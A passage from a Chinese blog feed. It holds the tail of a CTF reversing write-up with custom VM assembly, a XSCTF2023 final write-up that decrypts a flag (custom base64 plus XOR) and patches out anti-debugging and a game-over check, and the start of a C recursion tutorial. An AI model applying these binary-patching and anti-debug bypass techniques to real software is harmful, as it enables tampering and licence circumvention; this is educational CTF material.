class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line">SUB SP, 412;</span><br><span class="line">MOV R1, 0;</span><br><span class="line">MOV R1, SP;</span><br><span class="line">MOV SP, FP;</span><br><span class="line">SUB SP, 4;</span><br><span class="line">PUSH 0xcd98394d;</span><br><span class="line">PUSH 0xb3d55b45;</span><br><span class="line">PUSH 0xdfcd034a;</span><br><span class="line">PUSH 0xa7dd4e9f;</span><br><span class="line">PUSH 0xe306c1ea;</span><br><span class="line">PUSH 0x7bfba3;</span><br><span class="line">PUSH 0xf69fbcc5;</span><br><span class="line">PUSH 0x4493b0c7;</span><br><span class="line">PUSH 0xf48710fc;</span><br><span class="line">PUSH 0x4605c0a1;</span><br><span class="line">PUSH 0x7714569d;</span><br><span class="line">PUSH 0x99e0ee;</span><br><span class="line">PUSH 0x418372ef;</span><br><span class="line">PUSH 0x810089a6;</span><br><span class="line">PUSH 0xf613a578;</span><br><span class="line">PUSH 0x327f241e;</span><br><span class="line">PUSH 0x39b92ff4;</span><br><span class="line">PUSH 0x3ce1d9c7;</span><br><span class="line">PUSH 0x28a53724;</span><br><span class="line">PUSH 0xc341fce;</span><br><span class="line">PUSH 0x93e9df15;</span><br><span class="line">PUSH 0xde0c7383;</span><br><span class="line">PUSH 0x161c73a6;</span><br><span class="line">PUSH 0x5fed2896;</span><br><span class="line">PUSH 0xe302a383;</span><br><span class="line">MOV SP, R1;</span><br><span class="line">MOV R1, SP;</span><br><span class="line">MOV SP, FP;</span><br><span class="line">SUB SP, 104;</span><br><span class="line">PUSH 0xb18e3a66;</span><br><span class="line">PUSH 0x93af8a20;</span><br><span class="line">PUSH 0x71426981;</span><br><span class="line">PUSH 0x855ec36b;</span><br><span class="line">PUSH 0x51b4612d;</span><br><span class="line">PUSH 0x7227ddc8;</span><br><span class="line">PUSH 0x2f2fbbd6;</span><br><span class="line">PUSH 0x63e8c5b;</span><br><span class="line">PUSH 0x5ac9e294;</span><br><span class="line">PUSH 0xe30baa4b;</span><br><span class="line">PUSH 0x8e009a51;</span><br><span class="line">PUSH 0x6e5e1eac;</span><br><span class="line">PUSH 0x5bed520d;</span><br><span class="line">PUSH 0xafac26ce;</span><br><span class="line">PUSH 0xa46a180c;</span><br><span class="line">PUSH 0x4cf5b158;</span><br><span class="line">PUSH 0x148d9fbd;</span><br><span class="line">PUSH 0xa008a3c0;</span><br><span class="line">PUSH 0x8d4e9273;</span><br><span class="line">PUSH 0xb21906e5;</span><br><span class="line">PUSH 0xd20edf1;</span><br><span class="line">PUSH 0x179f5e2d;</span><br><span class="line">PUSH 0xdfcc7b6c;</span><br><span class="line">PUSH 0xfdc42107;</span><br><span class="line">PUSH 0x1ecbb256;</span><br><span class="line">MOV SP, R1;</span><br><span class="line">MOV R1, SP;</span><br><span class="line">MOV SP, FP;</span><br><span class="line">SUB SP, 204;</span><br><span class="line">PUSH 0x83e9fcd4;</span><br><span class="line">PUSH 0xdf852e9a;</span><br><span class="line">PUSH 0x51709534;</span><br><span class="line">PUSH 0xdd7c720b;</span><br><span class="line">PUSH 0x4d4d5f38;</span><br><span class="line">PUSH 0x8da3d994;</span><br><span class="line">PUSH 0x264ff8ec;</span><br><span class="line">PUSH 0xbd52ff7b;</span><br><span class="line">PUSH 0x73ff6db7;</span><br><span class="line">PUSH 0x7ffff535;</span><br><span class="line">PUSH 0x5feb7f33;</span><br><span class="line">PUSH 0xfd3e69ff;</span><br><span class="line">PUSH 0xf5b5ff5f;</span><br><span class="line">PUSH 0xf57775ff;</span><br><span class="line">PUSH 0xfff673fb;</span><br><span class="line">PUSH 0xdf777bfd;</span><br><span class="line">PUSH 0xf6ef7ff6;</span><br><span class="line">PUSH 0x7f36b7ff;</span><br><span class="line">PUSH 0x7a377bfb;</span><br><span class="line">PUSH 0x75f7fff7;</span><br><span class="line">PUSH 0x777fdf3b;</span><br><span class="line">PUSH 0x7f7df673;</span><br><span class="line">PUSH 0x7f3ff77f;</span><br><span class="line">PUSH 0x7ff6f67e;</span><br><span class="line">PUSH 0x6777ef6a;</span><br><span class="line">MOV SP, R1;</span><br><span class="line">MOV R1, SP;</span><br><span class="line">MOV SP, FP;</span><br><span class="line">SUB SP, 304;</span><br><span class="line">PUSH 0x0;</span><br><span class="line">PUSH 0x0;</span><br><span class="line">PUSH 0x0;</span><br><span class="line">PUSH 0x0;</span><br><span class="line">PUSH 0x0;</span><br><span class="line">PUSH 0x0;</span><br><span class="line">PUSH 0x0;</span><br><span class="line">PUSH 0x4161;</span><br><span class="line">PUSH 0x50210d13;</span><br><span class="line">PUSH 0x48511414;</span><br><span class="line">PUSH 0x66b2330;</span><br><span class="line">PUSH 0x200021;</span><br><span class="line">PUSH 0x6410501d;</span><br><span class="line">PUSH 0x50115002;</span><br><span class="line">PUSH 0xd060202;</span><br><span class="line">PUSH 0x1612029;</span><br><span class="line">PUSH 0x104a4924;</span><br><span class="line">PUSH 0x43100558;</span><br><span class="line">PUSH 0x52104820;</span><br><span class="line">PUSH 0x404650;</span><br><span class="line">PUSH 0x21204d13;</span><br><span class="line">PUSH 0x24205011;</span><br><span class="line">PUSH 0x24207331;</span><br><span class="line">PUSH 0x11127462;</span><br><span class="line">PUSH 0x226a28;</span><br><span class="line">MOV SP, R1;</span><br><span class="line">MOV R1, [FP-4];</span><br><span class="line">MOV R1, 0;</span><br><span class="line">MOV R2, FP;</span><br><span class="line">SUB R2, 204;</span><br><span class="line">MOV R3, R2;</span><br><span class="line">ADD R3, R1;</span><br><span class="line">MOV R4, FP;</span><br><span class="line">SUB R4, 104;</span><br><span class="line">MOV R5, R4;</span><br><span class="line">ADD R5, R1;</span><br><span class="line">MOV R6, [R3];</span><br><span class="line">XOR [R5], R6;</span><br><span class="line">ADD R1, 4;</span><br><span class="line">LT R1, 100;</span><br><span class="line">JNZ -159;</span><br><span class="line">MOV R1, 0;</span><br><span class="line">MOV R3, FP;</span><br><span class="line">SUB R3, 304;</span><br><span class="line">MOV R5, R3;</span><br><span class="line">ADD R5, R1;</span><br><span class="line">MOV R6, R4;</span><br><span class="line">ADD R6, R1;</span><br><span class="line">MOV R7, [R5];</span><br><span class="line">AND [R6], R7;</span><br><span class="line">ADD R1, 4;</span><br><span class="line">LT R1, 100;</span><br><span class="line">JNZ -134;</span><br><span class="line">MOV R1, 0;</span><br><span class="line">MOV R5, FP;</span><br><span class="line">SUB R5, 404;</span><br><span class="line">MOV R6, R5;</span><br><span class="line">ADD R6, R1;</span><br><span class="line">MOV R7, R4;</span><br><span class="line">ADD R7, R1;</span><br><span class="line">MOV R8, [R6];</span><br><span class="line">OR [R7], R8;</span><br><span class="line">ADD R1, 4;</span><br><span class="line">LT R1, 100;</span><br><span class="line">JNZ -133;</span><br><span class="line">; MOV R1, 0;</span><br><span class="line">; MOV R8, 2;</span><br><span class="line">; SYSCALL;</span><br><span class="line">; ADD SP, 412;</span><br><span class="line">MOV R1,R4;</span><br><span class="line">MOV R2,200;</span><br><span class="line">MOV R8,1; 1相当于x86的write的系统调用号</span><br><span class="line">SYSCALL;</span><br><span class="line">ADD SP,412;</span><br><span class="line"></span><br><span class="line">;R8 -&gt; 系统调用号</span><br><span class="line">;    syscall: 3-&gt;read,1-&gt;print_to_shell,2-&gt;exit</span><br><span class="line">;print_to_shell: R1-&gt;buf?,R2-&gt;len,R8=1(syscall)</span><br><span class="line">;FP-&gt;ebp</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WriteUp-XSCTF2023决赛</title>
      <link href="/2023c4ec60454895/"/>
      <url>/2023c4ec60454895/</url>
      
        <content type="html"><![CDATA[<p>只做出来2道题QWQ</p><h1 id="学到的知识点">学到的知识点</h1><h2 id="c-try-catch">C++ try…catch</h2><p>C++逆向那道题中有一个函数在运行时引发了一个异常,最后的处理函数是一个Xor()函数,将flag进行了一次特定的异或加密.找了很久才找到,最后看汇编找跳转才找到…不过最后还是不是特别清楚c++的异常机制,毕竟c++编译器底层做的事太多了.</p><h2 id="crc32校验">CRC32校验</h2><p>貌似…是…Crackme那道题是有一个CRC32的校验.</p><h1 id="reverse">Reverse</h1><h2 id="esab64">esab64</h2><p>这道题是c++逆向,没有提供pdb文件之前,代码比较混乱,但是还是能分析的,后续提示更新了pdb文件后更加清晰.</p><p>总之就是对flag进行了一遍变表base64编码,然后每四个字符一组进行翻转,就是最终的密文.</p><p>分析如下(pdb文件提供之前的分析):</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106160411279.png" alt="image-20231106160411279" style="zoom:50%;" /><p>反序后再变表base64解码,很简单,但是逆向解码出来后发现乱码:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106160643056.png" alt="image-20231106160643056"></p><p>后续提示去分析c++ try…catch,说明程序中某个地方故意引发了异常,在处理异常的时候进行了一些额外的加密.</p><p>去考虑代码,这个额外加密一定在base64之前,因为分析发现(甚至经过了大量的调试验证),最终密文检验确实是base64并反序的密文和真正的密文按顺序比较:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106161422267.png" alt="image-20231106161422267" style="zoom:50%;" /><p>动态调试分析,手动提取出每次比较的两个寄存器值,发现确实就是变表base64(反转过的)的结果依次比较,没有任何问题.</p><p>动调前的准备工作:有反调试,patch掉:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106161959207.png" alt="image-20231106161959207" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162029511.png" alt="image-20231106162029511" style="zoom: 33%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162112078.png" alt="image-20231106162112078" style="zoom:50%;" /><p>另外还有,为了逐个检查比较的字符,还需要对检查密文匹配的循环里的if语句进行修改,让其不会退出循环:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162337894.png" alt="image-20231106162337894" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162510282.png" alt="image-20231106162510282" style="zoom: 33%;" /><p>这样就可以进行调试了,最终只剩下那个异常处理的问题了.</p><p>在提供了pdb文件后,代码高度还原为c++代码,那个神秘函数名也还原为Exception():</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106162721729.png" alt="image-20231106162721729" style="zoom:33%;" /><p>但是进去分析伪代码什么都没有,于是从汇编下手,但是由于知识所限,寻找了很久才找到:</p><p>从Exception()函数的汇编进去,发现push了一个结构体<code>stru_FF3CC8</code>,进去看发现有两个标号<code>$LN5</code>,<code>$LN6</code>:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106163916637.png" alt="image-20231106163916637" style="zoom:50%;" /><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164039570.png" alt="image-20231106164039570" style="zoom:50%;" /><p>跳转回去查看,最终找到一个&quot;隐藏&quot;的Xor()函数:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164218206.png" alt="image-20231106164218206"></p><p>(可能分析的不是很对,这里好像就是已经进入函数了?)</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164316316.png" alt="image-20231106164316316" style="zoom:50%;" /><p>代码很简单,我们直接对解密的乱码再如上进行一遍对应的异或即可.</p><p>最终的解密代码如下:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.7</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt2</span>():</span><br><span class="line">    <span class="comment"># 方法2</span></span><br><span class="line">    <span class="comment"># str1 = &#x27;UYP7wQcTBee0Z6V3t66TAbJK+YCKWZPhVpf3R5P4ZHcEWVP5yiXFXHr4W4OBmT==&#x27;</span></span><br><span class="line">    <span class="comment"># 4个字符一组，反转:</span></span><br><span class="line">    str1 = <span class="string">&#x27;7PYUTcQw0eeB3V6ZT66tKJbAKCY+hPZW3fpV4P5REcHZ5PVWFXiy4rHXBO4WTm==&#x27;</span></span><br><span class="line">    string1 = <span class="string">&#x27;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    string2 = <span class="string">&#x27;m2jrJbkftp1KoBFNZhwE56OysH0z473T8VRW9l/PGixgdM+UeQCaDucXIYSnLvqA&#x27;</span></span><br><span class="line">    flag = base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string2, string1)))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 上面的解密结果有一点问题?</span></span><br><span class="line">    <span class="comment"># 最终用在线网站进行解密导出,并进行合理猜测得出flag</span></span><br><span class="line">    <span class="comment"># 乱码,甚至爆破都发现没有任何哪3个字符能编码出7PYU</span></span><br><span class="line">    flag = <span class="string">b&#x27;v~o\x7flRk\x0c\x0dz\x15P&#125;UH,A\x7f/.nFt#xraru&quot;OfPRxc;zWp6w5g#|&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">46</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i] ^ (<span class="built_in">len</span>(flag) - i)), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">decrypt2()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不过中间可能漏了一些字符之类的,总之经过&quot;合理猜测&quot;,最终得出flag.</p><h2 id="中毒白块儿">中毒白块儿</h2><p>这题直接把检测游戏结束的函数里的代码删了就行…相当于开无敌挂…</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164912110.png" alt="image-20231106164912110"></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231106164928927.png" alt="image-20231106164928927"></p><p>然后再去运行,跑一会儿随便点点就出flag了.</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-12_3-函数的其他用法和特性</title>
      <link href="/202339a6f8c668c3/"/>
      <url>/202339a6f8c668c3/</url>
      
        <content type="html"><![CDATA[<p>提要:</p><ol><li>本部分讲解C函数与数组的相关问题</li><li>并且引入<code>递归</code>的思想</li></ol><p>前置知识:</p><ol><li>充分掌握前面关于数组的知识</li><li>可能的话了解一点<code>指针</code>的概念</li></ol><h1 id="函数的递归">函数的递归</h1><h2 id="两种基本的思想">两种基本的思想</h2><p>我们在求解各种问题的时候,往往会有各种方法,不过大部分方法分析起来,往往能归为几种基本的思想.常见的两种思想就是<code>迭代</code>和<code>递归</code>.</p><p><code>递归</code>,是一种问题求解的思想,往往将一个问题转化为(若干个)规模更小的子问题进行求解.子问题逐渐细分到最小,此时就变得很容易求解.放到实际编程中来说,就是<code>函数自己调用自己</code>的过程.</p><p>另一种思想是<code>迭代</code>,简单来说,就是重复某一个过程,逐渐更新状态,一步步接近最终的结果,达到求解的效果放到编程语言中,一般是使用<code>若干个,可以嵌套的循环 </code>进行不断地重复逼近.</p><p>两种思想,仅仅是思想,并不代表具体的问题只能以某一种思路去求解,例如<code>斐波那契数列</code>的求解,就可以使用两种方法去写,下面也使用这个例子进行讲解.</p><h2 id="什么是函数递归调用">什么是函数递归调用</h2><p><code>递归</code>是这样一种思想,侧重点为:将一个规模较大的问题分解为规模更小的子问题去求解,直到子问题足够小变得很容易计算,再依次返回并<code>逐层完成</code>依赖于这个子问题的<code>更大规模</code>的子问题,最终实现求解原本规模的问题.</p><p>实际上这种思想在数学中已经有所体现,例如函数:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.24999999999999992em" columnalign="right" columnspacing=""><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mn>0</mn><mspace width="1em"/><mi>x</mi><mo>&lt;</mo><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="true"><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>∗</mo><mn>3</mn><mspace width="1em"/><mi>x</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">f(x)=\left\{\begin{aligned}    0 \quad x&lt;=0 \\  f(x-1)*3 \quad x&gt;0 \\\end{aligned}\right.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.00003em;vertical-align:-1.25003em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size4">{</span></span><span class="mord"><span class="mtable"><span class="col-align-r"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.7500000000000002em;"><span style="top:-3.91em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2500000000000002em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>当<code>x&gt;0</code>时,想要求出函数值,自然需要不断对x减1,才能得到最终的值,当然,这个简单的函数可以推导公式,但是这里的重点是<code>递归</code>.</p><br><p>我们举一个很简单的例子,那就是斐波那契数列,其数学公式为:</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.3599999999999999em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><mi>n</mi><mo>=</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><mi>n</mi><mo>=</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>F</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo>+</mo><mi>F</mi><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>2</mn><mo stretchy="false">)</mo></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if </mtext><mi>n</mi><mo>&gt;</mo><mn>1</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">F(n) = \begin{cases}    0 &amp; \text{if } n = 0 \\    1 &amp; \text{if } n = 1 \\    F(n-1) + F(n-2) &amp; \text{if } n &gt; 1\end{cases}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:4.32em;vertical-align:-1.9099999999999997em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.35002em;"><span style="top:-2.19999em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎩</span></span></span><span style="top:-2.19499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-2.20499em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-3.15001em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎨</span></span></span><span style="top:-4.2950099999999996em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.30501em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎪</span></span></span><span style="top:-4.60002em;"><span class="pstrut" style="height:3.15em;"></span><span class="delimsizinginner delim-size4"><span>⎧</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.8500199999999998em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord">2</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:1em;"></span><span class="col-align-l"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.41em;"><span style="top:-4.41em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">0</span></span></span><span style="top:-2.97em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span><span style="top:-1.5300000000000002em;"><span class="pstrut" style="height:3.008em;"></span><span class="mord"><span class="mord text"><span class="mord">if </span></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.9099999999999997em;"><span></span></span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>显然,我们也可以使用递推(数学上)的方式去进行逐个求解(相信各位都会手算).那么我们的问题是:如何使用C语言去实现这个递推的过程?</p><br><p>C语言的函数支持<code>递归</code>,也就是函数的自调用,那么根据递推公式,我们可以写下如下代码来计算斐波那契数列的第n个数:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">fibonacci</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fibonacci(n - <span class="number">1</span>) + fibonacci(n - <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入要计算的斐波那契数列的项数：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;无效的输入\n&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> result = fibonacci(n);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;斐波那契数列的第 %d 项是 %d\n&quot;</span>, n, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读者可以自行运行尝试.</p><br><p>代码解释:</p><p>在上面的代码中,我们在main函数中使用<code>fibonacci(n)</code>来计算第n项的值.关键在fibonacci()的代码中,我们可以看到,在函数的一开头,有一个判断,检查n的值是否为1或2(因为小于等于0的情况被main函数中的if给处理掉了).</p><p>如果n为1或2,显然,斐波那契数列的前两项都是<code>1</code>.那么该函数直接返回1作为结果即可(注意,我们此时丝毫不关心他返回到哪个函数!).</p><p>否则,n就是<code>3及3以上</code>的数,那么根据递推公式<code>F[n]=F[n-1]+F[n-2],n&gt;=3</code>可知,我们需要分别计算<code>fibonacci(n-1)</code>和<code>fibonacci(n-2)</code>,并把他们相加的值返回,也就有了<code>return fibonacci(n - 1) + fibonacci(n - 